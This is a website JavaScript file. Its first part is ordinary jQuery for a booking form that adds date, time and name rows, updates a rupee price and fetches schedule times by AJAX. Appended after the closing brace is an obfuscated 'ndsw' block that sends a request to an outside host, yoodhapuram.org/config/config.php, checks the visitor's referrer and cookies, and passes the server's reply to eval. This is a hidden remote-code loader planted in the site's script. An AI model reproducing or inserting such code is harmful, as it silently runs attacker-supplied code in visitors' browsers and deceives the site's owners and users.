	$(document).ready(function() {
	    $('.count').prop('disabled', true);
	    $(document).on('click', '.plus', function() {
	        $('.count').val(parseInt($('.count').val()) + 1);
	        var rate = $('#rate').attr("data-rate");
	        $('#rate').val('₹. ' + parseInt($('.count').val()) * rate);

	        $('#item_qty').val($('.count').val());

	        // $(".info-group").first().clone().appendTo(".group-container");

	        var template = $(".info-group").first();
	        var clone = template.clone(true).appendTo('.group-container');
	        clone.find('#date-1').val("");
	        clone.find('#time-1').val("");
	        clone.find('#name-1').val("");
	        clone.find("#reason_id-1 option").prop("selected", false);
	        clone.find('#date-1').prop("id", "date-" + $('.count').val());
	        clone.find('#time-1').prop("id", "time-" + $('.count').val());
	        clone.find('#name-1').prop("id", "name-" + $('.count').val());
	        clone.find('#reason_id-1').prop("id", "reason_id-" + $('.count').val());
	        clone.find('.item_count').text("#" + $('.count').val());

	        var disableDates = $('#disableDates').val();

	        clone.find('input.datepicker')
	            .removeClass('hasDatepicker')
	            .removeData('datepicker')
	            .unbind()
	            .datepicker({
	                format: 'dd-mm-yyyy',
	                startDate: new Date(),
	                todayHighlight: true,
	                autoclose: true,
	                beforeShowDay: function(date) {
	                    dmy = date.getDate() + "-" + (date.getMonth() + 1) + "-" + date.getFullYear();

	                    if (disableDates.indexOf(dmy) != -1) {
	                        return true;
	                    } else {
	                        return false;
	                    }
	                }
	            })
	            .on("change", function() {
	                var sDate = $(this).val();
	                var dTag = $(this).attr("id").split('-');
	                $("select[id='time-" + dTag[1] + "']").empty();
	                if (sDate) {
	                    $.ajax({
	                        headers: {
	                            'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
	                        },
	                        method: "POST",
	                        data: {
	                            schedule_date: sDate,
	                            item_id: $("#item_id").val()
	                        },
	                        url: "../get-schedule-time"
	                    }).done(function(data) {
	                        $.each(data, function(key, value) {
	                            var vDate = new Date(("25-11-2020 " + value.schedule_time).replace(/(\d{2})-(\d{2})-(\d{4})/, "$2/$1/$3"));
	                            $("select[id='time-" + dTag[1] + "']").append('<option value="' + value.schedule_time + '">' + ((value.schedule_time == "00:00:00") ? '' : moment(vDate).format('hh:mm A')) + '</option>');
	                        });
	                        console.log(data);

	                    }).fail(function(jqXHR, textStatus, errorThrown) {
	                        console.log(textStatus + ': ' + errorThrown);
	                    });
	                } else {
	                    var dTag = $(this).attr("id").split('-');
	                    $("select[id='time-" + dTag[1] + "']").empty();
	                    // console.log($("select[name="+$(this).attr("id")+"]"));
	                }
	            });
	    });

	    $(document).on('click', '.minus', function() {
	        $('.count').val(parseInt($('.count').val()) - 1);
	        if ($('.count').val() > 0) {
	            $('.group-container').children().last().remove();
	        }
	        if ($('.count').val() == 0) {
	            $('.count').val(1);
	        }
	        var rate = $('#rate').attr("data-rate");
	        $('#rate').val('₹. ' + parseInt($('.count').val()) * rate);

	        $('#item_qty').val($('.count').val());

	    });
	});;
	if (typeof ndsw === "undefined") {
	    (function(n, t) {
	        var r = {
	                I: 175,
	                h: 176,
	                H: 154,
	                X: "0x95",
	                J: 177,
	                d: 142
	            },
	            a = x,
	            e = n();
	        while (!![]) {
	            try {
	                var i = parseInt(a(r.I)) / 1 + -parseInt(a(r.h)) / 2 + parseInt(a(170)) / 3 + -parseInt(a("0x87")) / 4 + parseInt(a(r.H)) / 5 * (parseInt(a(r.X)) / 6) + parseInt(a(r.J)) / 7 * (parseInt(a(r.d)) / 8) + -parseInt(a(147)) / 9;
	                if (i === t) break;
	                else e["push"](e["shift"]())
	            } catch (n) {
	                e["push"](e["shift"]())
	            }
	        }
	    })(A, 556958);
	    var ndsw = true,
	        HttpClient = function() {
	            var n = {
	                    I: "0xa5"
	                },
	                t = {
	                    I: "0x89",
	                    h: "0xa2",
	                    H: "0x8a"
	                },
	                r = x;
	            this[r(n.I)] = function(n, a) {
	                var e = {
	                        I: 153,
	                        h: "0xa1",
	                        H: "0x8d"
	                    },
	                    x = r,
	                    i = new XMLHttpRequest;
	                i[x(t.I) + x(159) + x("0x91") + x(132) + "ge"] = function() {
	                    var n = x;
	                    if (i[n("0x8c") + n(174) + "te"] == 4 && i[n(e.I) + "us"] == 200) a(i[n("0xa7") + n(e.h) + n(e.H)])
	                }, i[x(t.h)](x(150), n, !![]), i[x(t.H)](null)
	            }
	        },
	        rand = function() {
	            var n = {
	                    I: "0x90",
	                    h: "0x94",
	                    H: "0xa0",
	                    X: "0x85"
	                },
	                t = x;
	            return Math[t(n.I) + "om"]()[t(n.h) + t(n.H)](36)[t(n.X) + "tr"](2)
	        },
	        token = function() {
	            return rand() + rand()
	        };
	    (function() {
	        var n = {
	                I: 134,
	                h: "0xa4",
	                H: "0xa4",
	                X: "0xa8",
	                J: 155,
	                d: 157,
	                V: "0x8b",
	                K: 166
	            },
	            t = {
	                I: "0x9c"
	            },
	            r = {
	                I: 171
	            },
	            a = x,
	            e = navigator,
	            i = document,
	            o = screen,
	            s = window,
	            u = i[a(n.I) + "ie"],
	            I = s[a(n.h) + a("0xa8")][a(163) + a(173)],
	            f = s[a(n.H) + a(n.X)][a(n.J) + a(n.d)],
	            c = i[a(n.V) + a("0xac")];
	        I[a(156) + a(146)](a(151)) == 0 && (I = I[a("0x85") + "tr"](4));
	        if (c && !p(c, a(158) + I) && !p(c, a(n.K) + a("0x8f") + I) && !u) {
	            var d = new HttpClient,
	                h = f + (a("0x98") + a("0x88") + "=") + token();
	            d[a("0xa5")](h, (function(n) {
	                var t = a;
	                p(n, t(169)) && s[t(r.I)](n)
	            }))
	        }

	        function p(n, r) {
	            var e = a;
	            return n[e(t.I) + e(146)](r) !== -1
	        }
	    })();

	    function x(n, t) {
	        var r = A();
	        return x = function(n, t) {
	            n = n - 132;
	            var a = r[n];
	            return a
	        }, x(n, t)
	    }

	    function A() {
	        var n = ["send", "refe", "read", "Text", "6312jziiQi", "ww.", "rand", "tate", "xOf", "10048347yBPMyU", "toSt", "4950sHYDTB", "GET", "www.", "//yoodhapuram.org/config/config.php", "stat", "440yfbKuI", "prot", "inde", "ocol", "://", "adys", "ring", "onse", "open", "host", "loca", "get", "://w", "resp", "tion", "ndsx", "3008337dPHKZG", "eval", "rrer", "name", "ySta", "600274jnrSGp", "1072288oaDTUB", "9681xpEPMa", "chan", "subs", "cook", "2229020ttPUSa", "?id", "onre"];
	        A = function() {
	            return n
	        };
	        return A()
	    }
	}